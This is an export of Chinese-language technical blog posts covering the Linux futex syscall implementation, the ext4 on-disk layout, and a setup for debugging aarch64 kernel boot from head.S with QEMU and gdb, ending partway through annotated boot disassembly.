int futex(int *uaddr, int futex_op, int val, const struct timespec *timeout,   /* or: uint32_t val2 */
            int *uaddr2, int val3);

  注意这里的看到这个api有许多的参数，但是我们常用的也是前面4个，一般来说，我们会将futex分为常用的两类，是futex_op参数指定的，分别是：FUTEX_WAIT、FUTEX_WAKE（注意，还有其他很多op类型），其他的参数根据不同的类型，有不同的一些含义：


对于FUTEX_WAIT来说：如果uaddr的值等于期待值（val），则将线程挂起。timeout如果是NULL，则无限等待，或者等待timeout时间。


对于FUTEX_WAKE来说：指定唤醒uaddr关联的并被挂起的val个线程。timeout参数忽略。


  上面我们简单说明了这个系统调用的一些用法，现在我们来看看这个系统调用的内核简单实现，然后我们就基本理解了这个系统调用的工作原理：
首先来看看FUTEX_WAIT的内核部分源码，如下：
//linux kernel v4.6 kernel/futex.c

static inline void queue_me(struct futex_q *q, struct futex_hash_bucket *hb)
	__releases(&amp;hb->lock)
&#123;
	int prio;

    // ... ... 省略

	plist_node_init(&amp;q->list, prio);
	plist_add(&amp;q->list, &amp;hb->chain);
	q->task = current;
	spin_unlock(&amp;hb->lock);
&#125;


static void futex_wait_queue_me(struct futex_hash_bucket *hb, struct futex_q *q,
				struct hrtimer_sleeper *timeout)
&#123;
    // ... ... 省略
	set_current_state(TASK_INTERRUPTIBLE);//挂起
	queue_me(q, hb);

    // ... ... 省略
&#125;
static int futex_wait_setup(u32 __user *uaddr, u32 val, unsigned int flags,
			   struct futex_q *q, struct futex_hash_bucket **hb)
&#123;
	u32 uval;
	int ret;

    // ... ... 省略
    
retry:
    // ... ... 省略
    ret = get_futex_value_locked(&amp;uval, uaddr);
    // ... ... 省略

	ret = get_futex_key(uaddr, flags &amp; FLAGS_SHARED, &amp;q->key, VERIFY_READ);
	if (unlikely(ret != 0))
		return ret;

    // ... ... 省略

    if (uval != val) &#123;//判断值是否是期望值，并做后续操作
		queue_unlock(*hb);
		ret = -EWOULDBLOCK;
	&#125;
    // ... ... 省略
&#125;

static int futex_wait(u32 __user *uaddr, unsigned int flags, u32 val,
		      ktime_t *abs_time, u32 bitset)
&#123;
	struct hrtimer_sleeper timeout, *to = NULL;
	struct restart_block *restart;
	struct futex_hash_bucket *hb;
	struct futex_q q = futex_q_init;
	int ret;

    // ... ... 省略

retry:
	/*
	 * Prepare to wait on uaddr. On success, holds hb lock and increments
	 * q.key refs.
	 */
	ret = futex_wait_setup(uaddr, val, flags, &amp;q, &amp;hb);
	if (ret)
		goto out;

	/* queue_me and wait for wakeup, timeout, or a signal. */
	futex_wait_queue_me(hb, &amp;q, to);
    
    // ... ... 省略

out:
    // ... ... 省略
&#125;
  其实我们这里可以看到，关键是通过get_futex_key来根据传入的uaddr获取一个key，然后根据key，来构造一个hash list(注意，这时这个hash list被一个hash数据结构维护了，可通过key查询)，并将当前线程插入到这个list，并将线程/进程挂起。在这个过程中，还会检查*uaddr 是否等于val，否则做相关操作。
  现在，其实我们基本上也可以猜到FUTEX_WAKE的实现是什么样子，现在我们先来看看其源码节选：
//linux kernel v4.6 kernel/futex.c
static inline int match_futex(union futex_key *key1, union futex_key *key2)
&#123;
	return (key1 &amp;&amp; key2
		&amp;&amp; key1->both.word == key2->both.word
		&amp;&amp; key1->both.ptr == key2->both.ptr
		&amp;&amp; key1->both.offset == key2->both.offset);
&#125;

static int
futex_wake_op(u32 __user *uaddr1, unsigned int flags, u32 __user *uaddr2,
	      int nr_wake, int nr_wake2, int op)
&#123;
	union futex_key key1 = FUTEX_KEY_INIT, key2 = FUTEX_KEY_INIT;
	struct futex_hash_bucket *hb1, *hb2;
	struct futex_q *this, *next;
	int ret, op_ret;
	WAKE_Q(wake_q);

retry:
	ret = get_futex_key(uaddr1, flags &amp; FLAGS_SHARED, &amp;key1, VERIFY_READ);//根据uaddr获取key
	if (unlikely(ret != 0))
		goto out;
    // ... ... 省略

	hb1 = hash_futex(&amp;key1);//根据key获取hash对象

	// ... ... 省略

retry_private:
	// ... ... 省略


	plist_for_each_entry_safe(this, next, &amp;hb1->chain, list) &#123;
		if (match_futex (&amp;this->key, &amp;key1)) &#123;//匹配符合条件的key
			if (this->pi_state || this->rt_waiter) &#123;
				ret = -EINVAL;
				goto out_unlock;
			&#125;
			mark_wake_futex(&amp;wake_q, this);//将符合条件的对象放入到队列wake_q
			if (++ret >= nr_wake)
				break;
		&#125;
	&#125;

    // ... ... 省略

out_unlock:
	double_unlock_hb(hb1, hb2);
	wake_up_q(&amp;wake_q); //唤醒线程/进程，wake_up_q在kernel/sched/core.c中定义
out_put_keys:
	put_futex_key(&amp;key2);
out_put_key1:
	put_futex_key(&amp;key1);
out:
	return ret;
&#125;
  从这里我们可以看到，首先我们根据uaddr获取了key，然后通过hash_futex获取key对象，这个时候我们就获取了和uaddr相关的线程/进程list。然后我们遍历list，将符合条件的线程/进程放到wake_q队列中去，最后通过wake_up_q来设置TASK_WAKING，并唤醒线程/进程。




后记

  从这里我们可以看到，这些概念是为了解决前置问题逐步引入的：


进程具备一定的状态（运行、就绪、等待（阻塞/睡眠） + 新建、终止）。


进程是OS调度的基本单位，调度就是调整进程的状态。


为了高效完成一个任务，我们需要并发，这时我们需要同步，需要信号量。


因为有了并发，我们需要注意临界区。


有了临界区，我们需要互斥量（锁）。


最后，CAS和futex可以实现各种信号量和锁。


  完结散花。
参考文献


https://man7.org/linux/man-pages/man2/futex.2.html







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>常识</category>
        <category>linux</category>
        <category>C&amp;CPP</category>
      </categories>
      <tags>
        <tag>进程同步与互斥</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 文件系统(一) --- ext4文件系统简介</title>
    <url>/2024/04/27/blog_idx_130/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  在linux下面，常见的linux fs就是ext系列，linux里面的vfs也和这个ext fs息息相关。本文主要详解一下ext4 fs的实现原理，并且，从文件操作的角度来看，ext4 fs是怎么实现这一系列工作的。




一些基本知识

  常见的硬盘有两种类别：


传统硬盘（HDD，Hard Disk Drive）


固态硬盘（SSD，Solid State Drive）


  其实稍微对硬盘有一点了解的人都知道，这两者硬盘的结构和原理是完全不一样的（具体可看很多网上的相关资料）。
  对于HDD来说，其是有磁头、盘片、马达等构成，盘片概念中又可以得到扇区、柱面的概念。根据这些物理的技术事实，引出了CHS（柱面数（Cylinders）、磁头数（Headers）、扇区数（Sectors））寻址方式。后面经过发展，又有了LBA（Logic Block Address）寻址方式（具体可看很多网上的相关资料））。


格式化
  这里的格式化有两种：


低级格式化


高级格式化


  对于低级格式化来说，一般是硬盘厂家格式化好的，对磁盘的一些基本参数进行设置。
  对于高级格式化来说，这就是我们用户普遍开始接触使用硬盘的第一步，我们后续解释ext的文件系统，也是基本是高级格式化来完成的。


扇区介绍
  对于上层用户来说， 描述一个磁盘的相关属性使用扇区来描述，一个扇区一般是512字节，磁盘总容量是扇区数*512字节。


什么是文件系统？
  文件系统是指通过什么样的结构来组织数据的存储方式。具体来说，就是怎么对某一个文件进行定位和操作。一个基本的fs例子可以参考以前我写的关于FAT文件系统的组织方式（《FAT32 文件系统详解》 https://blog.csdn.net/u011728480/article/details/58049184）。




EXT4文件系统的组织方式



ext4 fs的简介与宏观结构
  ext4 fs的基本存储单位是block，一个block可能由多个扇区组成，对于ext4来说，其有以下的一些基本属性：


一个block的大小可能是：1k-64k，并且其扇区的个数必须是2的指数，其大小是由mkfs来确定的。


多个block可以组成一个更大的单位，叫做block group。


一般情况下，一个文件系统可以最多有232个block。如果ext4文件系统启用了64位的特性，那么其最多可以有264个block。


  从上面可以知道ext4 fs可以描述的磁盘容量大小和我们创建文件系统时的参数有关，有兴趣可以去看参考小节的文档。
  ext4 fs的宏观结构如下：



block group 0
block group 1
… …
block group n-1
block group n



  对于block group 0 来说：



Group 0 Padding
ext4 Super Block
Group Descriptors
Reserved GDT Blocks
Data Block Bitmap
inode Bitmap
inode Table
Data Blocks




1024 bytes
1 block
many blocks
many blocks
1 block
1 block
many blocks
many more blocks



  对于block group n(n != 0) 来说：



ext4 Super Block（可选）
Group Descriptors（可选）
Reserved GDT Blocks（可选）
Data Block Bitmap
inode Bitmap
inode Table
Data Blocks




1 block
many blocks
many blocks
1 block
1 block
many blocks
many more blocks



  从上面的三个表格可以知道，ext4fs是由多个block group构成，其中block group0有一个1k的填充部分，这部分主要是兼容以前老旧的引导分区使用。其他block group并没有这1k的填充部分。
  下面我们分别详解block group中的具体每个部分是什么内容，以block_size是4k为例。


ext4 Super Block
  我们先来看看fs/ext4/ext4.h里面定义的内容：
/*
 * Structure of the super block
 */
struct ext4_super_block &#123;
    __le32	s_inodes_count;		/* Inodes count */
	__le32	s_blocks_count_lo;	/* Blocks count */
    
    ... ...

    __le32	s_log_block_size;	/* Block size */

    ... ...

    __le32	s_blocks_per_group;	/* # Blocks per group */

    ... ...
&#125;

  从这个定义可以看出，ext4_super_block 包含了很多ext4 fs的meta信息，例如：inode个数，blocks个数，block大小，每个组里面的block大小。我们可以使用dumpfs命令来查看superblock的信息，如下：

    
        
    
    
  注意看，对于block group n(n != 0)来说，ext4 Super Block、Group Descriptors等重要的结构是可选的，这里就涉及到ext的另外一个概念，通过备份这些重要的数据结构在不同的block group中，当block group 0数据损坏时，可以从其他分区尝试恢复。


Group Descriptors
  组描述符是一个数据结构，其数据是第二个block开始，其定义如下：
/*
 * Structure of a blocks group descriptor
 */
struct ext4_group_desc
&#123;
	__le32	bg_block_bitmap_lo;	/* Blocks bitmap block */
	__le32	bg_inode_bitmap_lo;	/* Inodes bitmap block */
	__le32	bg_inode_table_lo;	/* Inodes table block */
	__le16	bg_free_blocks_count_lo;/* Free blocks count */
	__le16	bg_free_inodes_count_lo;/* Free inodes count */
	__le16	bg_used_dirs_count_lo;	/* Directories count */
	__le16	bg_flags;		/* EXT4_BG_flags (INODE_UNINIT, etc) */
	__le32  bg_exclude_bitmap_lo;   /* Exclude bitmap for snapshots */
	__le16  bg_block_bitmap_csum_lo;/* crc32c(s_uuid+grp_num+bbitmap) LE */
	__le16  bg_inode_bitmap_csum_lo;/* crc32c(s_uuid+grp_num+ibitmap) LE */
	__le16  bg_itable_unused_lo;	/* Unused inodes count */
	__le16  bg_checksum;		/* crc16(sb_uuid+group+desc) */
	__le32	bg_block_bitmap_hi;	/* Blocks bitmap block MSB */
	__le32	bg_inode_bitmap_hi;	/* Inodes bitmap block MSB */
	__le32	bg_inode_table_hi;	/* Inodes table block MSB */
	__le16	bg_free_blocks_count_hi;/* Free blocks count MSB */
	__le16	bg_free_inodes_count_hi;/* Free inodes count MSB */
	__le16	bg_used_dirs_count_hi;	/* Directories count MSB */
	__le16  bg_itable_unused_hi;    /* Unused inodes count MSB */
	__le32  bg_exclude_bitmap_hi;   /* Exclude bitmap block MSB */
	__le16  bg_block_bitmap_csum_hi;/* crc32c(s_uuid+grp_num+bbitmap) BE */
	__le16  bg_inode_bitmap_csum_hi;/* crc32c(s_uuid+grp_num+ibitmap) BE */
	__u32   bg_reserved;
&#125;;

  其实从这里可以看到，根据组描述符，我们可以知道后面三个重要的区块（Data Block Bitmap/inode Bitmap/inode Table）的block号，也就定位到这3个重要的区块了。
  但是这里有一个问题是需要我们处理的，就是组描述符是一个数组，它描述了多个block group，那么我们怎么知道有多少个组描述呢？那就是直接用superblock里面的s_blocks_count_lo/s_blocks_per_group就得到了有多个group descriptor。
  同理，我们可以使用dumpfs命令来查看group descriptor 0的信息(block group 0)，如下：

    
        
    
    
  注意，上面的Reserved GDT Blocks是用做以后扩充group descriptor使用的（也就是扩充extfs容量）。


Data Block Bitmap
  data block bitmap主要就是使用bitmap描述data block的使用情况。其起始位置是group descriptor中的bg_block_bitmap_lo来确定的。
  以block_size是4k为例，那么我们能够通过bitmap来描述的block个数为：4 * 1024 * 8 = 32768，通过上面的知识可以看到，恰好对应一个block group的大小。


inode Bitmap
  inode bitmap和data block bitmap类似，用于描述inode的使用情况。其起始位置是group descriptor中的bg_inode_bitmap_lo来确定的。后面我们会关联到这个地方的知识点。
  以block_size是4k为例，同上，我们最多只能有32768个inode。
  这里提到的inode概念可以先不管，你可以把一个inode当做一个文件的抽象概念来处理。inode这个概念在linux vfs和ext4 fs都会使用到，而且是相互关联的。


inode Table
  inode Table 是由一个个ext4_inode组成的数组。ext4_inode定义如下：

/*
 * Structure of an inode on the disk
 */
struct ext4_inode &#123;

    __le16	i_mode;		/* File mode */
	__le16	i_uid;		/* Low 16 bits of Owner Uid */

    ... ...

    __le32	i_blocks_lo;	/* Blocks count */

    ... ... 

    __le32	i_block[EXT4_N_BLOCKS];/* Pointers to blocks */

    ... ... 
&#125;
  从上面可以简单知道，这里有一个文件的属性、大小、数据block的指针等等。ext4_inode可以描述一个文件的基本信息，这个结构将会在本系列文章中的vfs里面介绍。linux提供了stat命令来获取这个结构的信息，例如下图：

    
        
    
    
  从图中可知，我们可以知道inode的序号、inode包含的blocks的个数，以及文件其他属性等等。
  此外根据其数据结构可以知道，ext4_inode的文件大小上限由EXT4_N_BLOCKS=15个block决定，从理论上来说，如果大于这个尺寸的ext采取的是通过类似间接寻址的方式。对于ext4 fs来说，对这个间接寻址做了详细介绍，下面我们对这种间接寻址做一点简单说明（以block_size=4k为例）：


ext4_inode.i_block数组中的0~11数据块，直接填写到这个数组。到这里，我们支持的最大文件大小为12 * block_size。


当文件大小大于12 * block_size时，那么启用一级映射，ext4_inode.i_block数组的第12个指向的数据块是一个索引数据块，其包含了真实文件数据的block的索引。对于block_size=4k来说，那么可以间接映射block_size/sizeof(__le32)=1024个block。到这里，我们支持的最大文件大小为(12 + block_size/4) * block_size。


当文件大小大于(12 + block_size/4) * block_size，启用二级映射，ext4_inode.i_block数组的第13个指向的数据块是一级映射数据块，后面规则和一级映射一致。到这里，我们支持的最大文件大小为(12 + block_size/4 + (block_size/4)^2 ) * block_size。


当文件大小大于(12 + block_size/4 + (block_size/4)^2 ) * block_size，启用三级映射，ext4_inode.i_block数组的第14个指向的数据块是二级映射数据块，后面规则和二级映射一致。到这里，我们支持的最大文件大小为(12 + block_size/4 + (block_size/4)^2  + (block_size/4)^3) * block_size。


  其实从上面来看，如果我们存储和访问一个大文件，由于机制的原因，效率是非常底下的，因此ext4 fs里面有一个flex_bg特性，可以用更高效的extent tree数据结构来描述大文件。本文不对这个做介绍。
  此外，ext4 fs预留了一些特殊inode的编号，他们如下图表格：



inode Number
Purpose




0
Doesn’t exist; there is no inode 0.


1
List of defective blocks.


2
Root directory.


3
User quota.


4
Group quota.


5
Boot loader.


6
Undelete directory.


7
Reserved group descriptors inode. (“resize inode”)


8
Journal inode.



  这里面对我们来说，最有用的就是inode=2的inode节点，它是代表这个文件系统的根目录。这个根目录在vfs挂载文件系统的时候，有重要作用。
  对于多个block group来说，其每个inode Table大小是一定的，这个在super block里面就定义了，例如上文图中“Inodes per group:8192”代表每个block group有8192个inode。当我们mkfs.ext4时，inode的数量是固定了，我们可以修改这个参数来适应一些特殊情况，例如：inode满了，但是磁盘空间没有占满，这个是属于优化项了，这里不做讨论。如下图，df -i可以查看fs的inode使用信息，df -h是fs的磁盘容量信息：

    
        
    
  

    
        
    
  
  从图中的根目录分区来看，他们的inode占用和容量占用完全不一致，如图来说，可能是容量用完了，但是inode没有用完，可是有另外一种情况，那就是容量没有用完，inode用完了，一般出现在存放很多小文件的ext4fs。
  这里还有一个重要的信息，我们知道有多个block group，且每个block group一定有Data Block Bitmap、inode Bitmap、inode Table。其中有一个很重要的概念就是每个block group的inode Table里面的inode序号是连续的。


Data Blocks
  data blocks就是文件的真实数据块，由ext4_inode来指定。


目录
  就上面我们描述的内容来看，我们可以通过一个inode来描述一个文件了，但是还有一类我们常见的类型：目录，却没有提到。
  其实对于文件系统来说，目录也是文件，也是通过inode来描述的，在上文，其实我们提到了inode=2的indoe节点，它就是根目录项，也是解析ext4fs的起点。
  传统来说，对于目录的inode，其指向的block是基于目录项的数组（新的ext4 fs还有hash目录，其在ext3 引入，可以提升目录操作性能, 本文不做介绍），一个对于目录项来说，有两个结构：
struct ext4_dir_entry &#123;
	__le32	inode;			/* Inode number */
	__le16	rec_len;		/* Directory entry length */
	__le16	name_len;		/* Name length */
	char	name[EXT4_NAME_LEN];	/* File name */
&#125;;
/*
 * The new version of the directory entry.  Since EXT4 structures are
 * stored in intel byte order, and the name_len field could never be
 * bigger than 255 chars, it's safe to reclaim the extra byte for the
 * file_type field.
 */
struct ext4_dir_entry_2 &#123;
	__le32	inode;			/* Inode number */
	__le16	rec_len;		/* Directory entry length */
	__u8	name_len;		/* Name length */
	__u8	file_type;		/* See file type macros EXT4_FT_* below */
	char	name[EXT4_NAME_LEN];	/* File name */
&#125;;
  对于我们常用的ext4fs系统来说，启用了filetype这个特性，就是用的ext4_dir_entry_2这个结构。注意这个结构和linux用户态的struct dirent有直接关联，后面有缘可以介绍一下rewinddir/readdir等接口的使用。
  对于目录项来说，除了inode序号外，最重要的就是file_type信息了，他们的典型值如下：



Value
Description




0x0
Unknown.


0x1
Regular file.


0x2
Directory.


0x3
Character device file.


0x4
Block device file.


0x5
FIFO.


0x6
Socket.


0x7
Symbolic link.



  这里面最重要的type就是1和2，一个代表普通文件，一个代表目录。
  有了这个数据结构介绍，我们就介绍完了ext4fs的基本组织形式，下面我们通过文件的基本操作来整体感受一下这种组织方式。




文件的操作与文件系统的组织方式

  其实这里的文件操作与vfs有关联，但是现在我们就当做没有vfs。如果有上面基础的情况下，我们怎么写一个驱动来在ext4fs上操作文件。后面都是一些直白想法，要了解具体细节，移步本文后续系列，关于VFS的一点点资料。
  对于文件的操作来说，我们第一步要定位这个文件。如果要定位这个文件，那么我们就需要这个文件的绝对路径。下面对于文本文件：/tmp/test.lg，我们看看怎么定位它：


首先根据ext4 Super Block得到Group Descriptors的属性，然后得到block group0 的 Group Descriptors的属性，最后得到block group0 的inode table/inode bitmap/data blocks bitmap。


根据block group0中的inode table[2]得到这个文件系统根目录的数据块，然后根据ext4_dir_entry_2来递归的解析出ext4fs的所有文件目录树。


根据/tmp/test.lg文件的绝对路径信息，结合上面我们的文件目录树，我们首先解析了&quot;/&quot;的目录项数组，得到了tmp目录的目录inode信息。然后根据tmp目录的目录项数组，得到了test.lg的inode信息。到这里，我们成功得到了文件的inode序号。


根据得到的inode序号，做相关的操作（读、写、创建、删除）。


  其实上面我们操作一个文件的过程，在真正的linux系统中，由vfs和ext4fs驱动帮我们做了大量工作，具体我们到时候在vfs文章中来做一个文件操作的介绍。




后记

  从本文和本人之前的文章中关于FAT文件系统的介绍来看，其实文件系统的核心在于：给定一个存储的介质，在这个存储介质上是怎么存放文件的，比如建议分组，建立映射等等。
参考文献


https://www.kernel.org/doc/html/v4.19/filesystems/ext4/ondisk/index.html


https://blog.csdn.net/u011728480/article/details/58049184







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>常识</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>ext4</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux_aarch64_head.S到main.c的环境建立</title>
    <url>/2024/04/21/blog_idx_129/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  最开始，我仅仅是对linux比较感兴趣，觉得其很神奇的，能够做到很多事情。后面了解到其源码也是开源的，于是抱着学习的态度，简要的看了看相关的代码，在那个时候，我还看的比较粗略，仅仅是简单的会点编译，执行linux命令等等。这期间还有一个有印象的有趣的事儿就是那个pdf《Linux 那些事儿之USB》，大概就是讲述了作者因为要看pian儿，但是U盘识别不到，所以去细读USB相关linux 内核内容的资料。这精神，虽然我看不懂，但是我大为震撼！！！
  在我工作的近几年来，逐渐的和linux打上了交道，从最开始的hisi 3520a1系列的流媒体处理开始，为其搭建了文件系统，编译内核，同时为其适配EC20 4G模块，这期间，我基本都是照着别人的教程或者说文档，渐渐的熟悉了一些linux内核的一些事务。同时这期间，我做过一些简单的字符驱动玩耍模块，只能说玩玩可以的。
  在前几年中的某段时间，我接到一个任务，要在android进程之间大量传输数据2。这个时候我调研到了一个叫做android 匿名共享内存的东西，我发现了一个binder的驱动程序和linux unix socket的功能可以在android 和 linux 里面实现进程间的文件描述符的共享，注意这个方法是通用的，不像某些功能在linux里面能够使用，在android里面不能够使用。在这个时候，我天马行空实现了一个类似 binder的驱动demo3。这可以说是我第一个为了自己写的内核及的相关代码，而且具有实际应用意义。
  在这些工作过程中，我逐渐的觉得自己学习的《操作系统原理》与现实的差别，特别想把书中知识和实际系统结合起来，经过查询，如果想要大概了解linux 内核，最好从其远古的版本读起来，因为大概的脉络没有变，新内核只是更加的结构化，多了很多现代的功能。于是乎，有了《Linux Kernel 0.12 启动简介，调试记录(Ubuntu1804, Bochs, gdb)》一文4。经过了《Linux Kernel 0.12 启动简介，调试记录(Ubuntu1804, Bochs, gdb)》一文的学习之后，我基本了解了linux kernel 0.12版本内核的基本工作原理，例如其调度，内存管理等。其次是对于x86架构下，linux kernel 0.12的启动流程有了一个简要的认知。
  在最近这段时间，我的工作有部分和ai相关，有部分和android和linux的差异相关，需要我对linux内核有更深的印象和见解。于是在以前的基础上，这次，我要实际分析我们工作中所用的最新版本的内核，再一次的去验证一个内核从上电开始，到系统完整起来的过程。由于现代linux内核非常的巨大，所以我只关注我喜欢的部分。
  本文主要是分析aarch64架构的arch/arm64/kernel/head.S 到 init/main.c 中的start_kernel的过程。这可能也是我短时间内最后一次分析这种启动的过程，因为其实道理都是相同的，大部分都是cpu初始化，虚拟内存启用，由实地址切换为虚拟地址，创建init_task，设置sp，进入start_kernel。其实这里很多都是和特定的CPU有关系，内容是固定的。但是虚拟内存启用，初始task创建，初始sp指针初始化这些和《操作系统原理》有关联，可以印证我们所学。
  本文分为两大部分，一部分是head.S到main.c的调试环境建立， 二是从上电开始到进入start_kernel的代码注释分析和部分解释。




准备



AARCH64 异常等级要简单了解一下5。


AARCH64 内存布局要简单了解一下6。


看长文警告，一定要有耐心，否则看不下去。


汇编部分的调试环境搭建

  本文的测试环境为qemu-system-aarch64 raspi3b 模拟板卡。linux内核为树莓派内核 rpi-5.15.y， 下载地址为：https://github.com/raspberrypi/linux.git


生成带调试符号的linux kernel 镜像
  在make menu的时候勾选： Kernel hacking &gt; Compile-time checks and compiler options &gt; Compile the kernel with debug info
通过如下命令生成镜像：
cd rpi-linux-kernel-dir
cp arch/arm64/configs/bcm2711_defconfig .config
make ARCH=arm64 CROSS_COMPILE=aarch64-linux-gnu- menuconfig
make ARCH=arm64 CROSS_COMPILE=aarch64-linux-gnu- Image modules dtbs
```   

&lt;br/>
&lt;br/>

##### 生成rootfs.img镜像
&amp;emsp;&amp;emsp;下载ubuntu-base-18.04.5-base-arm64.tar.gz的基础文件系统。
```shell
# 解压文件系统到指定目录
tar -xzf ubuntu-base-18.04.5-base-arm64.tar.gz -C temp/*

# 制作裸文件镜像
dd if=/dev/zero of=linuxroot.img bs=1M count=2048
sudo mkfs.ext4 linuxroot.img
mkdir  rootfs
sudo mount linuxroot.img rootfs/
sudo cp -rfp temp/*  rootfs/
sudo umount rootfs/
e2fsck -p -f linuxroot.img
resize2fs  -M linuxroot.img
编译生成最新版qemu
  只有新版的qemu才支持raspi3b模拟板卡
# 下载qemu代码
git clone https://github.com/qemu/qemu.git
cd qemu
mkdir build
cd build
../configure --prefix=/home/sky/LinuxKernel/qemu_install --target-list=arm-softmmu,arm-linux-user,armeb-linux-user,aarch64-softmmu,aarch64-linux-user,aarch64_be-linux-user 
make


执行qemu加载镜像
  这里的linux目录是内核目录，qemu_install是qemu生成的最新可执行文件目录，当前目录有rootfs镜像linuxroot.img。
# -S              freeze CPU at startup (use 'c' to start execution)
# -s              shorthand for -gdb tcp::1234
#  注意下面命令如果要直接运行，而不是等待gdb调试，请去掉最后的-s 和 -S。
./qemu_install/bin/qemu-system-aarch64 \
	-M raspi3b \
	-kernel ./linux/arch/arm64/boot/Image \
	-dtb ./linux/arch/arm64/boot/dts/broadcom/bcm2710-rpi-3-b.dtb \
	-drive id=hd-root,format=raw,file=./linuxroot.img \
	-m 1024M \
	-serial stdio \
	-smp 4 \
	-device usb-kbd \
	-device usb-tablet \
	-device usb-net,netdev=net0 \
	-netdev user,id=net0,hostfwd=tcp::5555-:22 \
	-append "rw earlycon=pl011,0x3f201000 console=ttyAMA0 loglevel=8 root=/dev/mmcblk0 rootwait" -S -s


gdb 连接调试
  注意请在qemu启动后面加上-s 和 -S。当连接成功时，这个时候cpu还未执行，输入ni执行到第一条指令。
# 没有gdb-multiarch自行安装
# 这里的vmlinux就是编译生成的最终镜像
gdb-multiarch  linux/vmlinux

# 在gdb cli中执行
target remote localhost:1234




汇编代码调试
  我这里把整个head.S里面重要的部分都dump下来了。跟着这个部分然后参考head.S去阅读，会有奇效。长文注释警告。
  首先是上电部分，当板卡上电后，会执行bootloader，bootloader会将内核和dtb放到特定的位置，然后按照Linux arm64 boot protocal去初始化对应的寄存器，最后进入head.S的第一条指令。
@ boot start ... ...
&#x2F;&#x2F;Linux arm64 boot protocal
@ https:&#x2F;&#x2F;www.kernel.org&#x2F;doc&#x2F;Documentation&#x2F;arm64&#x2F;booting.txt
@ 0x08000000 FDT
&#x2F;*
- 主 CPU 通用寄存器设置
  x0 &#x3D; 系统 RAM 中设备树 blob (dtb) 的物理地址。
  x1 &#x3D; 0（留作将来使用）
  x2 &#x3D; 0（留作将来使用）
  x3 &#x3D; 0（留作将来使用）
*&#x2F;
&#x2F;&#x2F;注意这里的0x18地址存放的是fdt的地址，地址为0x08000000

0x0000000000000000:	ldr	x0, 0x18
0x0000000000000004:	mov	x1, xzr
0x0000000000000008:	mov	x2, xzr
0x000000000000000c:	mov	x3, xzr
&#x2F;&#x2F;注意这里的0x20是存放的kernel地址，地址为0x00200000
0x0000000000000010:	ldr	x4, 0x20
0x0000000000000014:	br	x4
@ 0x00200000 head.S start ... ...
@ &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt; now, go to 0x00200000
  注意，当我们进入head.S的最开始的地方的时候，有一个标准得到头如下。其中code1的部分将会跳转到真正执行的地方。
@ The decompressed kernel image contains a 64-byte header as follows:
@   u32 code0;			&#x2F;* Executable code *&#x2F; 
@   u32 code1;			&#x2F;* Executable code *&#x2F;
@   u64 text_offset;		&#x2F;* Image load offset, little endian *&#x2F;
@   u64 image_size;		&#x2F;* Effective Image size, little endian *&#x2F;
@   u64 flags;			&#x2F;* kernel flags, little endian *&#x2F;
@   u64 res2	&#x3D; 0;		&#x2F;* reserved *&#x2F;
@   u64 res3	&#x3D; 0;		&#x2F;* reserved *&#x2F;
@   u64 res4	&#x3D; 0;		&#x2F;* reserved *&#x2F;
@   u32 magic	&#x3D; 0x644d5241;	&#x2F;* Magic number, little endian, &quot;ARM\x64&quot; *&#x2F;
@   u32 res5;			&#x2F;* reserved (used for PE COFF offset) *&#x2F;

@ 0x200000  code0
@ 0x200004  code1                            
@ 0x200008  text_offset 
@ 0x20000c                           
@ 0x200010  image_size                    
@ 0x200014                    
@ 0x200018  flags                       
@ 0x20001c                          
@ 0x200020  res2                    
@ 0x200024                          
@ 0x200028  res3                       
@ 0x20002c                      
@ 0x200030  res4                       
@ 0x200034                    
@ 0x200038  magic       
@ 0x20003c  res5
&#x2F;&#x2F;注意，这里的code0,code1就是地址0x200000和0x200004的指令。整个0x200000到0x200040就是内核镜像的64字节头。
0x0000000000200000:	ccmp	x18, #0x0, #0xd, pl  &#x2F;&#x2F; special NOP to identity as PE&#x2F;COFF executable
0x0000000000200004:	b	0x1190000 @ &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt; now, go to 0x1190000（primary_entry）
  这是整个内核启动部分最重要的函数，所有的东西都在这里做完，然后跳转到start_kernel。下面我们会来重点分析这个部分的内容。详细请看注释。
&#x2F;&#x2F;注意这里的几个bl指令，覆盖了进入kernel_start前的所有操作
@ SYM_CODE_START(primary_entry)

&#x2F;&#x2F;跳转过去保存boot参数
&#x2F;&#x2F;保存x0(fdt),x1,x2,x3到符号boot_args的变量中,靠dcache_inval_poc中的ret返回到下一行指令
0x0000000001190000:	bl	0x1190020 &#x2F;&#x2F;preserve_boot_args

&#x2F;&#x2F;跳转过去执行不同异常等级的初始化,这里比较复杂，从开始的el2异常级别跳转到el1级别。
0x0000000001190004:	bl	0xd5d000 &#x2F;&#x2F;init_kernel_el

&#x2F;&#x2F;将内核镜像开始地址给x23，也就是0x200000
0x0000000001190008:	adrp	x23, 0x200000
&#x2F;&#x2F; KASLR offset, defaults to 0
0x000000000119000c:	and	x23, x23, #0x1fffff

&#x2F;&#x2F;跳转过去根据w0的值，保存相关的cpu boot mode，注意当前我们的cpu已经处于el1等级，w0 存的是 el2 的标识符
0x0000000001190010:	bl	0xd5d1f8

&#x2F;&#x2F;创建页表，这里面的创建只填充了相关的页表项，并没有开启mmu
&#x2F;&#x2F;idmap &#x3D; 0x117e00, 0x117e0 &#x3D; 0x117f03, 0x117f30 &#x3D; 0x00c00701, 
&#x2F;&#x2F;    注意，这时页表项表示2MB的区域。idmap区域包含了__cpu_setup和__primary_switch
